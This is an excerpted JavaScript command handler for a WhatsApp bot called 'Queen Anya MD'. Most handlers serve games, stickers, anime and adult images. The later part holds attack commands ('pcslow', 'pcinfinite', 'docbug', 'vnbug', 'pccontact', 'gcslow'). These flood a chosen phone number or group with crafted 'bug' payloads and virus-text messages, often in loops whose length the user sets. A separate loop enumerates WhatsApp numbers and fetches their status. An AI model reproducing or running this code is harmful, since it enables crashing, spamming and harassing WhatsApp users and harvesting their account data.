              ...
              bufferdare = await getBuffer(`https://telegra.ph/file/d71f54d2a142c956f5cbf.jpg`)
              Anya.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
              break
                            break
       case 'truth':
              const truth =[
    ...
    "do you play pubg, if you then send ur id number"
              ...
              Anya.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ xeontruth }, {quoted:m})
              break  
case 'fliptext': {
...
case 'toviewonce': case 'toonce': { 
        ...
        if (/image/.test(mime)) {
anuoncr2 = await Anya.downloadAndSaveMediaMessage(quoted)
Anya.sendMessage(m.chat, {image: {url: anuoncr2},viewOnce : true},{quoted: m })
        } else if (/video/.test(mime)) {
        anuonce2 = await Anya.downloadAndSaveMediaMessage(quoted)
        Anya.sendMessage(m.chat, {video: {url: anuonce2},viewOnce : true},{quoted: m })
        }
        }
        break
case 'autostickergc':
...
m.reply('Success in turning off antivirus this group')
  ...
  await Anya.sendButtonText(m.chat, buttonsntvirtex, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'nsfw': {
...
m.reply('Success in turning off nsfw in this group')
  ...
  await Anya.sendButtonText(m.chat, buttonsntnsfw, `Please click the button below\n\nOn to enable\nOff to disable`, `${global.botname}`, m)
  }
  }
  break
case 'mediafire': {
...
*Link* : ${baby1[0].link}`
m.reply(`${result4}`)
Anya.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply(mess.error))
}
break
case 'lyrics2': {
...
${lyrics.lyrics}`
console.log(lyrics)
 await Anya.sendMessage(m.chat, {text:txt},{quoted:m})
} catch (err) {
    console.log(err)
    }
    break
...
case 'image': {
		...
		let { pinterest } = require('./lib/scraperW')
                ...
                Anya.sendMessage(m.chat, { image: { url: resultkkk3 }, caption: ` ${themeemoji} Media Url : `+resultkkk3 }, { quoted: m })
            }
            break
...
Anya.sendMessage(from, {sticker:fs.readFileSync("gifee.webp")},{quoted:m})
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Anya.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: global.atnm })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maximum 10 seconds!')
let media = await quoted.download()
...
let mese = await Anya.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await Anya.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return m.reply(`Example: ${prefix + command} 10`)
media = await Anya.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
...
Anya.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
...
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
Anya.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
...
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
...
var walb = [
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, wal,{ quoted:m }).catch(err => {
                    return('Error!')
                })
//Anya.sendMessage(m.chat,{image:{url:wallpaper[i].image},caption:`*Query :* ${q}`})            
break
case 'igemoji': 
case 'instagramemoji': 
...
case 'cry':case 'kill':case 'hug':case 'pat':case 'lick':case 'kiss':case 'bite':case 'yeet':case 'neko':case 'bully':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'awoo':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'cuddle':case 'highfive':case 'shinobu':case 'megumin':case 'handhold':
					...
					.then(({data}) => {
						Anya.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
					})
					break
case 'loli-waifu':
					m.reply(mess.wait)
					...
					.then(({data}) => {
					Anya.sendImage(m.chat, data.url, mess.success, m)
					})
					break
...
if (!AntiNsfw) return m.reply(mess.nsfw)
                ...
                Anya.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return m.reply(mess.group)
...
m.reply(mess.wait)
 ...
 let trapbot = [
  ...
  headerType: 1
            ...
            await Anya.sendMessage(m.chat, button2Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-neko' :
...
if (!AntiNsfw) return m.reply(mess.nsfw)
 ...
 let hnekobot = [
  ...
  headerType: 1
            ...
            await Anya.sendMessage(m.chat, button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'hentai-waifu' :
...
m.reply(mess.wait)
 ...
 let nwaifubot = [
  ...
  headerType: 1
            ...
            await Anya.sendMessage(m.chat, button4Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gasm':
...
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonsssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break  
case 'milf':
...
Anya.sendMessage(m.chat, { caption: mess.success, image: { url: xeonyresult.url }, buttons: but, footer: botname }, { quoted: m })
break 
case 'ahegao':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return m.reply(mess.nsfw)
...
m.reply(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    ...
    await Anya.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return m.reply(mess.group)
...
var xeonyresultx = pickRandom(ahegaonsfw)
    await Anya.sendMessage(m.chat,{video:xeonyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case'slap2':
if(!quoted){
...
const mention = msg
const mentionedId = await Anya.getName(mention.mentionedIds)
...
const contact1 = await Anya.getName(qmid)
...
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/smug`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, button1ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'foxgirl':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, button12ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animenom' :
m.reply(mess.wait)
 ...
 let xxhnekobot = [
  ...
  headerType: 1
            ...
            await Anya.sendMessage(m.chat, xx1button3Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewaifu':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, button112ssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
m.reply(mess.wait)						
   waifud = await axios.get('https://waifu.pics/api/sfw/neko')
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat,buttonssMessage, { quoted:m }).catch(err => {
                    return('Error!')
                })               
                break
case 'animecuddle':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonsosMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break   
case 'animeslap':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, btutttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepat':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, xxbuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeneko':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/neko`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonsTsMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonussMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekiss':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, bxxuttonssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewlp':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttoxnssMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animespank':
...
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecry':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/cry`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, button1ssxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animekill':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/kill`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsxMessages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animelick':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx12Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebite':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/bite`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx123Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeyeet':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/yeet`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx124Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebully':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/lick`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx125Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animebonk':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/bonk`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx126Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewink':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/wink`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx127Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animepoke':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/poke`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx128Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmile':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/smile`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx129Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animewave':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/wave`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1210Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeawoo':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/awoo`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1211Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeblush':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/blush`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1212Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animesmug':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/smug`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1213Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animeglomp':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/glomp`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1214Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehappy':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/happy`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1215Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animedance':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/dance`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1216Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animecringe':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/cringe`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1217Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehighfive':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/highfive`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1218Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animehandhold':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/handhold`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1219Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'animemegumin':
m.reply(mess.wait)						
 waifudd = await axios.get(`https://api.waifu.pics/sfw/megumin`)
      ...
      headerType: 4
            ...
            await Anya.sendMessage(m.chat, buttonszzsx1220Messages,{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'shinobu2':  
...
await Anya.sendMessage(m.chat,buttonsesMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break
case 'animemegumin':
...
await Anya.sendMessage(m.chat,buttonzMessage, { quoted:m }).catch(err => {
     return('Error!')
    })               
break     
case 'animeawoo':
m.reply(mess.wait)						
 ...
 var wbuttsss = [
  ...
  headerType: 2
            ...
            await Anya.sendMessage(m.chat, button1Messages, { quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'loli':
...
await Anya.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
throw mess.error
}
...
❄ *Description:* ${anime.synopsis}*`
                await Anya.sendMessage(m.chat,{image:{url:anime.picture}, caption:animetxt},{quoted:m})
                break
case 'patrick':
case 'patricksticker': {
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/AnyaMedia/main/patrick')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Anya.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
}
break
case 'ttp': {
           if (!text) return m.reply(`*Example : ${prefix + command} hello*`)
           await Anya.sendMedia(m.chat, `https://cililitan.herokuapp.com/api/texttopng2?teks=${text}`, 'A L Y A', 'B O T M D', m, {asSticker: true})
...
case 'dogestick':
	case 'doge':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/AnyaMedia/main/doge')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Anya.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
...
case 'lovesticker':
case 'lovestick' :{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/AnyaMedia/main/love')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Anya.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
...
case 'gura':
case 'gurastick':{
var ano = await fetchJson('https://raw.githubusercontent.com/DGXeon/AnyaMedia/main/gura')
var wifegerak = ano.split('\n')
var wifegerakx = wifegerak[Math.floor(Math.random() * wifegerak.length)]
encmedia = await Anya.sendImageAsSticker(from, wifegerakx, m, { packname: global.packname, author: global.author, })
await fs.unlinkSync(encmedia)
...
break
            ...
            await Anya.sendButtonText(m.chat, buttons, jawab, botname, m)
            }
            break
            case 'is': {
...
case 'runtime': {
                ...
                await Anya.sendButtonText(m.chat, buttons, lowq, botname, m, {quoted: fkontak})
            	}
            break
case 'handsomecheck':
...
Anya.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
...
Anya.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
					...
					Anya.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
				     break
                    case 'awesomecheck':
  case 'greatcheck':
    case 'gaycheck':
...
case 'toqr':{
  ...
  await Anya.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: m })
...
if (args.length === 0) throw `Where is the link?\nSend ${prefix + command} url`
        ...
        ig.fetchPost(urlInsta).then((res) => {
            ...
            console.log(error);
            Anya.sendMessage(m.chat, { text: `Must be private or unavailable` }, { quoted: m })
        });
}
break
...
if (!text) return m.reply(`Where is the link?`)
       ...
       const response = await Anya.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await Anya.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
...
RedditImageFetcher.fetch({
            ...
            Anya.sendMessage(m.chat,{image:{url:akusingle.image}},{quoted:m})
        })
        .catch(err => {
            m.reply ("Not found!")
        })
...
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   Anya.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
...
thumbnail: fs.readFileSync("AnyaMedia/theme/Anya.jpg"),
mediaType:1,
mediaUrl: '',
sourceUrl: ""
}}
...
var inputnumber = text.split(" ")[0]
        ...
        for (let i = 0; i < randomxx; i++) {
            ...
            var anu = await Anya.onWhatsApp(`${number0}${i}${number1}@s.whatsapp.net`)
            var anuu = anu.length !== 0 ? anu : false
            try {
                try {
                    var anu1 = await Anya.fetchStatus(anu[0].jid)
                } catch {
                    var anu1 = '401'
                }
...
case 'pcbut':
  ...
  {buttonId: 'xeon', buttonText: {displayText: xeonvirtex}, type: 1}
                    ...
                    buttonMsgX = {
                      ...
                      Anya.sendMessage(`${text}@s.whatsapp.net`, buttonMsgX)
                      reply(mess.success)
                    break
case 'pcstick':{
...
xeonOP = { 
 ...
 xeonsteker = fs.readFileSync('./AnyaBug/Anya.jpg')
Anya.sendImageAsSticker(`${text}@s.whatsapp.net`, xeonsteker, xeonOP, { packname: global.packname, author: global.author })
...
xeonvn = { 
 ...
 xaudio = fs.readFileSync('./AnyaBug/fullChudaiBaazi.mp3')
 Anya.sendMessage(`${text}@s.whatsapp.net`, {audio: xaudio, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonvn})
...
var xeonmess = await prepareWAMessageMedia({ image: xpicvirus }, { upload: Anya.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": xeonmess.imageMessage,
"productId": "99999999999999",
"title": `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ${xeonbutton} ${xeonbutton}`,
"description": `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ${xeonbutton} ${xeonbutton}`,
"currencyCode": "INR",
"footerText": botname,
...
"businessOwnerJid": "94711449492@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: xeontalog })
Anya.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
}
}
break
	case 'vnbug':{
...
xeonyvn = { 
 ...
 xeonyaud = fs.readFileSync('./AnyaBug/fullChudaiBaazi.mp3')
 Anya.sendMessage(m.chat, {audio: xeonyaud, mimetype: 'audio/mpeg', ptt:true }, {quoted: xeonyvn})
 }
 }
break
	case 'docbug':{
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
Anya.sendMessage(m.chat, {document: xpicvirus},{quoted: {
key: {
fromMe: false, 
...
"fileName": `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ×͜× ${xeonbrutal(prefix)}`,
...
case 'pcslow': { 
             ...
             xeonyh1 = { 
                    ...
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ʙᴜɢs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴹᴿ ʜᴇx ᴜʟᴛʀᴀ ᴛᴇᴄʜ👻`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:xeonyh1})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:xeonyh1})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:xeonyh1})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 94xxxxxxxxxx`)
            ...
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘"},{quoted:pmgcmassxeon})
         ...
         case 'gcslow':               
            ...
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcmassxeon})
            await sleep(30000)
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcmassxeon})
            await sleep(30000)
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcmassxeon})
            ...
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcinfinitexeon})
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcinfinitexeon})
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcinfinitexeon})
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcinfinitexeon})
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:gcinfinitexeon})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
            ...
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcinfinitexeon})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxxxxxx`)
            ...
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcgcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcgcinfinitexeon})
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcgcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcgcinfinitexeon})
            await Anya.sendMessage(m.chat, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcgcinfinitexeon})
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:"Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️"},{quoted:pcgcinfinitexeon})
...
`
            ...
            await Anya.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await Anya.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await Anya.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await Anya.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
            await Anya.sendMessage(m.chat, {text:bunnygcxez},{quoted:bunnygcxeon13})
...
`
            ...
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:rabbitxeon},{quoted:rabbitbugxeon})
...
`
            ...
            await Anya.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await Anya.sendMessage(m.chat, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
            await sleep(30000)
            await Anya.sendMessage(`${text}@s.whatsapp.net`, {text:bunnypcgcx},{quoted:xeonpcgcbunny})
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
kwkwkx = '``Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ʙᴜɢs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴹᴿ ʜᴇx ᴜʟᴛʀᴀ ᴛᴇᴄʜ👻``',
Anya.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
}
}
break
case 'pccontact': {
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
